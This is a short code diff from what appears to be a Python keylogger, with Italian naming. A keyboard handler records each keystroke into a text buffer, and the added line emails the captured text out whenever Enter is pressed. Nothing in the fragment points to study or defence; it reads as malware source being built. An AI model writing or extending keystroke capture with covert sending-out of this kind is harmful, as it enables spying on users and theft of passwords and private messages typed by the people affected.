@@ -31,6 +31,7 @@ def press(key):
         TestoEmail.testo +=" "
     elif key == Key.enter:
         TestoEmail.testo += "\n" 
+        sendemail.send_email(TestoEmail.testo.replace("'","")) 
     elif key == Key.shift:
         TestoEmail.testo += ""      
     else:    
